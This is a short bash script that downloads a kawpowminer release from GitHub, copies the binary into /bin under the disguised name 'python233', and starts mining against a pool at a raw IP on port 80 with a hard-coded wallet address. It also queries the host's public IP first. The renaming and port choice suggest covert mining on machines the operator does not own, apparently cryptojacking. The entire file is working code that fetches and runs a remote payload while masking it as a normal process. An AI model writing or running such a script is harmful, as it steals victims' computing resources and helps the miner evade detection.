#!bin/bash -xe 
curl ipinfo.io
# Version 1.2.3
# wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
# unzip kawpowminer-ubuntu18-1.2.3.zip
# version1.2.2
wget https://github.com/nanopool/kawpowminer/releases/download/1.2.2/kawpowminer-ubuntu18-1.2.2.zip
unzip kawpowminer-ubuntu18-1.2.2.zip
ls -la
cd kawpowminer-ubuntu18-1.2.2
chmod +x kawpowminer
cp kawpowminer /bin/python233
python233 -G -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80
